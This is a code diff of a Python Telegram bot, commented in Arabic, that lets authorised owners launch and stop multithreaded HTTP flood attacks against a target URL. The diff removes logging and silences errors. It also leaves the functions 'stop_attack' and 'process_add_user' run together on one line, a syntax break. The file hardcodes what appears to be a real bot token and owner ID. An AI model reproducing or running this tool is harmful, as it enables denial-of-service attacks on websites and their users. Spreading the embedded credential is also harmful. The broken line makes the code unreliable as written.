@@ -2,15 +2,10 @@ import httpx
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
-from datetime import datetime
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import logging
 import asyncio
 import os
-
-# إعداد السجلات مع مستوى تصحيح أكثر تفصيلاً
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # قائمة المالكين والمستخدمين
 Owner = ['6358035274']
@@ -29,16 +24,14 @@ def read_users():
     try:
         with open('owners.txt', 'r') as file:
             Owner.extend(file.read().splitlines())
-        logging.info("تم تحميل قائمة المالكين بنجاح.")
     except Exception as e:
-        logging.error(f"حدث خطأ أثناء قراءة owners.txt: {e}")
+        pass
         
     try:
         with open('normal_users.txt', 'r') as file:
             NormalUsers.extend(file.read().splitlines())
-        logging.info("تم تحميل قائمة المستخدمين بنجاح.")
     except Exception as e:
-        logging.error(f"حدث خطأ أثناء قراءة normal_users.txt: {e}")
+        pass
 
 read_users()
 
@@ -57,11 +50,8 @@ async def attack(url):
                 data = response.content
                 with lock:
                     bytes_transferred += len(data)
-                logging.debug(f"تم إرسال الطلب إلى: {url}")
-            except httpx.RequestError as e:
-                logging.error(f"حدث خطأ في الطلب: {e}")
-            except Exception as e:
-                logging.error(f"حدث خطأ غير متوقع: {e}")
+            except Exception:
+                pass
 
 async def start_attack(url):
     """بدء الهجوم عبر عدة خيوط"""
@@ -76,7 +66,6 @@ async def start_attack(url):
 def stop_attack():
     """إيقاف الهجوم"""
     stop_attack_event.set()
-    logging.info("تم إيقاف الهجوم.")
 
 def calculate_speed():
     """حساب سرعة النقل ومراقبة الأداء"""
@@ -86,12 +75,10 @@ def calculate_speed():
         with lock:
             speed = bytes_transferred / (1024 * 1024)
             bytes_transferred = 0
-        logging.info(f"سرعة النقل: {speed:.2f} MB/s")
 
 # يجب تعيين التوكن بشكل مباشر
 TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # هنا يجب أن تضع توكن البوت الخاص بك
 if not TOKEN:
-    logging.error("لم يتم تعيين رمز البوت")
     raise Exception('Bot token is not defined')
 
 bot = telebot.TeleBot(TOKEN)
@@ -112,7 +99,9 @@ def send_welcome(message):
         markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
         bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
     else:
-        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
+        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
+
+@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
 def callback_query(call):
     """التعامل مع الردود التفاعلية"""
     if call.data == "add_user":
@@ -126,9 +115,7 @@ def callback_query(call):
         bot.register_next_step_handler(msg, process_start_attack)
     elif call.data == "stop_attack":
         stop_attack()
-        bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
-
-def process_add_user(message):
+        bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")def process_add_user(message):
     """إضافة مستخدم إلى القائمة"""
     user_id = message.text.strip()
     if user_id and user_id not in NormalUsers:
@@ -137,10 +124,8 @@ def process_add_user(message):
                 file.write(user_id + '\n')
             NormalUsers.append(user_id)
             bot.reply_to(message, "تمت إضافة المستخدم بنجاح.")
-            logging.info("تمت إضافة المستخدم بنجاح.")
-        except Exception as e:
+        except Exception:
             bot.reply_to(message, "حدث خطأ أثناء إضافة المستخدم.")
-            logging.error(f"خطأ أثناء إضافة المستخدم: {e}")
     else:
         bot.reply_to(message, "المستخدم موجود بالفعل في القائمة أو معرف المستخدم غير صحيح.")
 
@@ -154,10 +139,8 @@ def process_remove_user(message):
                 for user in NormalUsers:
                     file.write(user + '\n')
             bot.reply_to(message, "تمت إزالة المستخدم بنجاح.")
-            logging.info("تمت إزالة المستخدم بنجاح.")
-        except Exception as e:
+        except Exception:
             bot.reply_to(message, "حدث خطأ أثناء إزالة المستخدم.")
-            logging.error(f"خطأ أثناء إزالة المستخدم: {e}")
     else:
         bot.reply_to(message, "المستخدم غير موجود في القائمة أو معرف المستخدم غير صحيح.")
 
@@ -175,7 +158,6 @@ def process_start_attack(message):
         bot.send_message(message.chat.id, "الهجوم جاري. اضغط على الزر أدناه لإيقاف الهجوم:", reply_markup=markup)
     else:
         bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")
-        logging.warning("فشل في إدخال رابط الهدف بشكل صحيح.")
 
 def main():
     """تشغيل البوت"""
